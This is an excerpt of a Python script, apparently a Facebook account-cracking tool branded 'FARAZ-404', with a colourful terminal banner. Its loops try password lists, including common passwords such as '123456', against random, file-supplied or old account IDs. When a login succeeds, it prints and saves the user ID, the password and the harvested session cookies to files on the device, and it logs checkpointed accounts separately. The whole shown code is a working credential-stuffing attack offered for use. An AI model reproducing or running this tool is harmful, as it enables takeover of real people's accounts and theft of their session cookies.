...
{G}╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{vb} 🔧 DEVELOPER {vcv} ➤ FARAZ{G}-{W}404
{vb} 📦 FEATURES  {vcv} ➤ RANDOM{G}⚡{W}FILE{G}⚡{W}OLD
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
    	...
    	try:
    	    ...
    	    for pw in passlist:
                ...
                if "session_key" in po:
                    ids = str(po['uid'])
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f"\r\r{vb}{G}/{W}>{B}FARAZ-OK{W}< {vcv}{B} "+ids+f"{G} / {B}"+pas+"\033[1;97m")
                    print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                    linex()
                    open('/sdcard/GIFT-BY-FARAZ-FILE-M2-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f"\r\r{vb}{G}/{W}>{Y}FARAZ-CP{W}< {vcv}{Y} "+ids+f"{G} / {Y}"+pas+"\033[1;97m")
                    linex()
                    open('/sdcard/GIFT-BY-FARAZ-FILE-M2-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
    	...
    	try:
            for pas in passlist:
                ...
                if "session_key" in po:
                    ...
                    if "Live" in response:
                        print(f"\r\r{vb}{G}/{W}>{B}FARAZ-OK{W}< {vcv}{B} {str(uid)} {G}/{B} {pas}")
                        print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                        linex()
                        open('/sdcard/GIFT-BY-FARAZ-RANDOM-M1-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                    ...
                    linex()
                    open('/sdcard/GIFT-BY-FARAZ-RANDOM-M1-CP.txt','a').write(str(uid)+'/'+pas+'\n')
            ...
            for pas in passlist:
                ...
                if "session_key" in po:
                    ...
                    if "Live" in response:
                        ...
                        print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                        linex()
                        open('/sdcard/GIFT-BY-FARAZ-RANDOM-M2-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                        self.oks.append(str(uid))
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    uid = po['error']['error_data']['uid']
                    print(f"\r\r{vb}{G}/{W}>{Y}FARAZ-CP{W}< {vcv}{Y} {str(uid)} {G}/{Y} {pas}")
                    linex()
                    open('/sdcard/GIFT-BY-FARAZ-RANDOM-M2-CP.txt','a').write(str(uid)+'/'+pas+'\n')
                    self.cps.append(str(uid))
                    break
                else:continue
            self.loop += 1
    	...
    	try:
    	    ...
    	    for pas in ["123456","1234567","12345678","123456789","123123","143143"]:
                ...
                if "session_key" in po:
                    ...
                    open('/sdcard/GIFT-BY-GIFT-By-FARAZ-OLD-OK.txt','a').write(ids+'/'+pas+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    print(f"\r\r{vb}{G}/{W}>{Y}NOOR-CP{W}< {vcv}{Y} {ids}{G} / {Y}{pas} \033[1;97m")
                    open('/sdcard/GIFT-By-FARAZ-OLD-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
